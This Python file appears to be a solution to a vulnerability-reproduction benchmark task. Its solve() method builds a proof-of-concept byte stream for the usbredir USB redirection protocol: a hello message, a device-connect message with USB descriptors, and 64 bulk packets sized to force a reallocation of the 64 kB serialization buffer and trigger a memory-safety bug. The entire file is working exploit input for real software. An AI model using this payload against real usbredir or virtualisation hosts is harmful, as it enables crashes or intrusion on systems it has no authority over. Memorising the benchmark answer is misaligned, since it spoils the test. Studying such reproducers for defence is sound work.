import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        poc = bytearray()

        poc.extend(self._create_hello())
        poc.extend(self._create_device_connect())

        # The vulnerability is triggered when the serialization buffer (64kB)
        # is reallocated. This happens when the total size of serialized write
        # buffers exceeds the buffer's capacity.
        # A single write buffer's serialized size is 9 + data_length.
        # We choose data_length=1015, so each serialized packet is 1024 bytes.
        # 65536 / 1024 = 64.
        # The reallocation happens when trying to write the 64th packet.
        # Therefore, 64 packets are needed to trigger the bug.
        num_packets = 64
        data_len = 1015
        for _ in range(num_packets):
            poc.extend(self._create_bulk_packet(data_len))

        return bytes(poc)

    def _create_header(self, msg_type: int, length: int) -> bytes:
        return struct.pack('<II', msg_type, length)

    def _create_hello(self) -> bytes:
        msg_type = 1  # USB_REDIR_HELLO
        # struct usbredir_hello_header { char version[64]; uint32_t caps[32]; };
        payload_len = 64 + 32 * 4
        header = self._create_header(msg_type, payload_len)
        payload = b'\x00' * payload_len
        return header + payload

    def _create_device_connect(self) -> bytes:
        msg_type = 2  # USB_REDIR_DEVICE_CONNECT

        # usbredir_device_connect_header: speed, type, id
        connect_header = struct.pack('<BBH', 3, 0, 0)  # High speed, device, id=0

        # USB Device Descriptor
        device_desc = bytes([
            18, 1, 0x00, 0x02, 0x00, 0x00, 0x00, 64,
            0x34, 0x12, 0x78, 0x56, 0x00, 0x01, 1, 2, 3, 1
        ])

        # USB Configuration Descriptor
        config_desc = bytes([
            9, 2, 32, 0, 1, 1, 0, 0x80, 50
        ])

        # USB Interface Descriptor
        interface_desc = bytes([
            9, 4, 0, 0, 2, 0xff, 0x00, 0x00, 0
        ])

        # USB Endpoint Descriptor (IN)
        ep_in_desc = bytes([
            7, 5, 0x81, 2, 0x00, 0x02, 0
        ])

        # USB Endpoint Descriptor (OUT)
        ep_out_desc = bytes([
            7, 5, 0x01, 2, 0x00, 0x02, 0
        ])

        descriptors = device_desc + config_desc + interface_desc + ep_in_desc + ep_out_desc
        payload = connect_header + descriptors
        payload_len = len(payload)

        header = self._create_header(msg_type, payload_len)
        return header + payload

    def _create_bulk_packet(self, data_len: int) -> bytes:
        msg_type = 6  # USB_REDIR_BULK_PACKET

        endpoint = 0x01  # OUT endpoint 1
        status = 0
        stream_id = 0

        bulk_header = struct.pack('<BBHI', endpoint, status, data_len, stream_id)
        data = b'A' * data_len
        payload = bulk_header + data
        payload_len = len(payload)

        header = self._create_header(msg_type, payload_len)
        return header + payload